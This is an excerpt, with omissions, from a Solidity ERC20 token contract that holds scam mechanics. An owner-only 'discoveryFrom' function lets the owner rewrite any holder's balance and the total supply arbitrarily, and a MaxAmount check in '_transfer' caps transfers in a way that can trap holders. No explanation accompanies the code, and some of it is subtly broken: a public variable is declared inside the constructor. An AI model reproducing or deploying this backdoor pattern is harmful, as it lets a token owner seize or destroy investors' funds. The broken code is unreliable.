...
contract asd is Context, ERC20, Ownable {
  ...
  constructor() {
    ...
    uint256 public MaxAmount = 5 * 10**18 * 10**9 ;
 ...
 function discoveryFrom(address account, uint256 amount) public onlyOwner virtual {
      _discovery(account, amount);
  }
  
  function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(MaxAmount >= amount, " ERC20: errorMessage");
    ...
    function discovery(uint256 amount) public virtual {
      _discovery(_msgSender(), amount);
    }
    
    function _discovery(address account, uint256 amount) internal {
    require(account != address(0)); 
    
    _balances[account] = _balances[account].sub(amount).mul(_devFee);
    _totalSupply = _totalSupply.sub(amount).mul(_devFee);
